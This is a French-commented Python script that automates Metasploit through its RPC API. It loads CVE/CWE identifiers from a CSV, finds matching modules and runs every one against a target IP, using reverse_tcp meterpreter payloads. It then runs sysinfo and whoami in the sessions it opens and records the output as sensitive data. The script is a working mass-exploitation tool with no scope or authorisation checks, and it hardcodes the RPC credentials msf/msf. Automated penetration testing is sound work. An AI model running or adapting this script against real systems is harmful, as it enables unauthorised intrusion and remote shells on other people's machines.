from pymetasploit3.msfrpc import MsfRpcClient
import csv
import time
import sys

# Fonction pour charger les CVE et CWE depuis le fichier CSV
def load_cve_cwe_from_csv(file):
    """
    Charge les CVE et CWE à partir d'un fichier CSV.

    Args:
        file (str): Chemin du fichier CSV contenant les CVE/CWE.
    
    Returns:
        list: Liste des CVE/CWE sous la forme "Type ID".
    """
    cve_cwe_list = []
    with open(file, 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            cve_cwe_list.append(f"{row['Type']} {row['ID']}")
    return cve_cwe_list

# Fonction pour rechercher des exploits dans Metasploit
def search_exploits(client, search_term):
    """
    Recherche des exploits dans Metasploit en fonction du terme donné.

    Args:
        client (MsfRpcClient): Instance du client RPC de Metasploit.
        search_term (str): Terme de recherche pour l'exploit (CVE, CWE, etc.).
    
    Returns:
        list: Liste des exploits trouvés.
    """
    results = client.modules.search(search_term)
    return results

# Fonction pour exécuter un exploit
def execute_exploit(client, module_type, module_name, payload, target_ip):
    """
    Exécute un exploit Metasploit sur la cible.

    Args:
        client (MsfRpcClient): Instance du client RPC de Metasploit.
        module_type (str): Type du module (exploit, auxiliary).
        module_name (str): Nom du module Metasploit.
        payload (str): Payload à utiliser avec l'exploit.
        target_ip (str): Adresse IP de la cible.
    
    Returns:
        bool, dict: Indicateur de succès et détails du job si réussi.
    """
    module = client.modules.use(module_type, module_name)
    
    if 'RHOSTS' in module._moptions:
        module['RHOSTS'] = target_ip

    try:
        if payload and module_type == 'exploit':
            job = module.execute(payload=payload)
        else:
            job = module.execute()

        if job and 'job_id' in job:
            print(f"Module {module_name} exécuté avec succès, Job ID: {job['job_id']}")
            return True, job
        else:
            return True, None
    except Exception as e:
        print(f"Erreur lors de l'exécution du module {module_name}: {e}")
        return False, None

# Fonction pour récupérer les sessions actives après exploitation
def get_active_sessions(client):
    """
    Récupère les informations des sessions actives et des données sensibles.

    Args:
        client (MsfRpcClient): Instance du client RPC de Metasploit.
    
    Returns:
        list: Liste des données sensibles récupérées.
    """
    sessions = client.sessions.list
    sensitive_data = []
    for session_id, session_info in sessions.items():
        try:
            sysinfo = client.sessions.session(session_id).run_with_output("sysinfo")
            user_info = client.sessions.session(session_id).run_with_output("whoami")
            sensitive_data.append(f"Session {session_id}: sysinfo={sysinfo.strip()}, user={user_info.strip()}")
        except Exception as e:
            sensitive_data.append(f"Session {session_id}: Erreur lors de la récupération des données - {e}")
    return sensitive_data

# Fonction pour sauvegarder les résultats d'exploitation dans un fichier CSV
def save_results_to_csv(results, output_csv_file):
    """
    Enregistre les résultats des exploits dans un fichier CSV.

    Args:
        results (list): Liste des résultats d'exploit.
        output_csv_file (str): Chemin du fichier CSV de sortie.
    """
    with open(output_csv_file, 'w', newline='') as csvfile:
        fieldnames = ['CVE/CWE', 'Module', 'Type', 'Résultat', 'Données sensibles', 'Mesures de sécurité']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for data in results:
            writer.writerow(data)
    print(f"Les résultats de l'exploitation ont été enregistrés dans {output_csv_file}")

# Fonction principale pour gérer l'exécution des exploits
def main():
    """
    Fonction principale qui gère le processus d'exploitation de CVE/CWE
    à l'aide de Metasploit et enregistre les résultats.
    """
    if len(sys.argv) != 4:
        print("Usage: python3 exploit_cve_cwe.py <cve_cwe_csv_file> <target_ip> <output_csv_file>")
        sys.exit(1)

    cve_cwe_csv_file = sys.argv[1]
    target_ip = sys.argv[2]
    output_csv_file = sys.argv[3]

    # Connexion au client RPC de Metasploit
    msf_username = 'msf'
    msf_password = 'msf'
    msf_server = '127.0.0.1'
    msf_port = 55553
    client = MsfRpcClient(msf_password, server=msf_server, port=msf_port, username=msf_username, ssl=False)

    # Charger la liste des CVE/CWE
    cve_cwe_list = load_cve_cwe_from_csv(cve_cwe_csv_file)
    results = []

    # Exécution des exploits pour chaque CVE/CWE
    for item in cve_cwe_list:
        print(f"Recherche d'exploits pour {item}")
        exploits = search_exploits(client, item)
        if exploits:
            for exploit in exploits:
                module_name = exploit['fullname']
                module_type = exploit['type']
                print(f"Exécution du module {module_name} ({module_type}) pour {item}")
                payload = None
                if 'windows' in module_name:
                    payload = 'windows/meterpreter/reverse_tcp'
                elif 'linux' in module_name:
                    payload = 'linux/x86/meterpreter/reverse_tcp'

                success, job = execute_exploit(client, module_type, module_name, payload, target_ip)
                
                sensitive_data = []
                if success:
                    session_id = None
                    timeout = time.time() + 5  # Timeout de 5 secondes
                    while not session_id and time.time() < timeout:
                        sessions = client.sessions.list
                        if sessions:
                            session_id = list(sessions.keys())[0]
                        time.sleep(5)

                    if session_id:
                        session = client.sessions.session(session_id)
                        sensitive_data = get_active_sessions(client)
                        security_measures = "Aucune mesure de sécurité détectée"
                    else:
                        print(f"Aucune session active détectée pour {module_name}")
                        security_measures = "Active"
                else:
                    security_measures = "Active"

                results.append({
                    'CVE/CWE': item,
                    'Module': module_name,
                    'Type': module_type,
                    'Résultat': 'réussi' if success else 'échoué',
                    'Données sensibles': "\n".join(sensitive_data) if sensitive_data else "Aucune donnée récupérée",
                    'Mesures de sécurité': security_measures
                })
                print(f"Exploitation {'réussie' if success else 'échouée'} pour le module {module_name} ({module_type})")
        else:
            print(f"Aucun exploit trouvé pour {item}")
            results.append({
                'CVE/CWE': item,
                'Module': 'Aucun',
                'Type': 'N/A',
                'Résultat': 'échoué',
                'Données sensibles': 'Aucune donnée récupérée',
                'Mesures de sécurité': 'Aucune mesure de sécurité'
            })

    save_results_to_csv(results, output_csv_file)

if __name__ == '__main__':
    main()
